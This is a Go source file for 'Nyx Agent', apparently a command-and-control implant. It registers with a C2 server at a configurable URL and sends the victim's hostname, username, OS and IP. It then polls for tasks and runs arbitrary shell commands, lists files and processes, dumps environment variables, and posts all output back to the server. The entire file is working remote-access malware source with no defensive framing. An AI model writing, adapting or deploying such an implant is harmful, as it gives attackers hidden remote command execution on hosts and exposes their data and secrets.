package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const C2_URL = "http://127.0.0.1:8000"

type CheckinRequest struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	IP       string `json:"ip"`
}

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

type CheckinResponse struct {
	AgentID string  `json:"agent_id"`
	Sleep   string  `json:"sleep"`
	Jitter  string  `json:"jitter"`
	Task    *Task   `json:"task"`
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Status string `json:"status"`
}

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	Timeout: 30 * time.Second,
}

func getOutboundIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func checkin(agentID string) (*CheckinResponse, error) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := CheckinRequest{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		IP:       getOutboundIP(),
	}

	data, _ := json.Marshal(payload)
	resp, err := client.Post(C2_URL+"/api/agents/checkin", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result CheckinResponse
	json.NewDecoder(resp.Body).Decode(&result)
	return &result, nil
}

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/C", command)
	default:
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	output := out.String() + stderr.String()
	if output == "" && err != nil {
		output = err.Error()
	}
	return output, nil
}

func handleTask(agentID string, task *Task) {
	fmt.Printf("[*] Task received: %s\n", task.Command)

	var output string
	var status string

	parts := strings.SplitN(task.Command, " ", 2)
	cmd := parts[0]

	switch cmd {
	case "shell":
		if len(parts) < 2 {
			output = "Usage: shell <command>"
			status = "failed"
		} else {
			out, err := executeCommand(parts[1])
			output = out
			if err != nil {
				status = "failed"
			} else {
				status = "completed"
			}
		}

	case "sysinfo":
		hostname, _ := os.Hostname()
		username := os.Getenv("USER")
		if username == "" {
			username = os.Getenv("USERNAME")
		}
		output = fmt.Sprintf("Hostname: %s\nUser: %s\nOS: %s\nArch: %s\nPID: %d",
			hostname, username, runtime.GOOS, runtime.GOARCH, os.Getpid())
		status = "completed"

	case "sleep":
		if len(parts) < 2 {
			output = "Usage: sleep <seconds>"
			status = "failed"
		} else {
			output = fmt.Sprintf("Sleep set to %s seconds", parts[1])
			status = "completed"
		}

	case "pwd":
		dir, _ := os.Getwd()
		output = dir
		status = "completed"

	case "ls":
		path := "."
		if len(parts) > 1 {
			path = parts[1]
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			output = err.Error()
			status = "failed"
		} else {
			var lines []string
			for _, e := range entries {
				if e.IsDir() {
					lines = append(lines, "[DIR]  "+e.Name())
				} else {
					info, _ := e.Info()
					lines = append(lines, fmt.Sprintf("[FILE] %s (%d bytes)", e.Name(), info.Size()))
				}
			}
			output = strings.Join(lines, "\n")
			status = "completed"
		}

	case "ps":
		out, err := executeCommand("ps aux")
		if err != nil {
			out, err = executeCommand("tasklist")
		}
		output = out
		if err != nil {
			status = "failed"
		} else {
			status = "completed"
		}

	case "whoami":
		out, _ := executeCommand("whoami")
		output = strings.TrimSpace(out)
		status = "completed"

	case "env":
		var envs []string
		for _, e := range os.Environ() {
			envs = append(envs, e)
		}
		output = strings.Join(envs, "\n")
		status = "completed"

	default:
		out, err := executeCommand(task.Command)
		output = out
		if err != nil {
			status = "failed"
		} else {
			status = "completed"
		}
	}

	result := TaskResult{
		TaskID: task.ID,
		Output: output,
		Status: status,
	}

	data, _ := json.Marshal(result)
	url := fmt.Sprintf("%s/api/agents/%s/result", C2_URL, agentID)
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		fmt.Printf("[-] Failed to send result: %v\n", err)
		return
	}
	defer resp.Body.Close()
	fmt.Printf("[+] Result sent for task %s\n", task.ID)
}

func main() {
	fmt.Println("[*] Nyx Agent starting...")

	var agentID string
	sleepSeconds := 5

	for {
		resp, err := checkin(agentID)
		if err != nil {
			fmt.Printf("[-] Checkin failed: %v\n", err)
			time.Sleep(time.Duration(sleepSeconds) * time.Second)
			continue
		}

		agentID = resp.AgentID
		fmt.Printf("[+] Checked in as %s\n", agentID)

		if s, err := strconv.Atoi(resp.Sleep); err == nil {
			sleepSeconds = s
		}

		if resp.Task != nil {
			handleTask(agentID, resp.Task)
		}

		time.Sleep(time.Duration(sleepSeconds) * time.Second)
	}
}
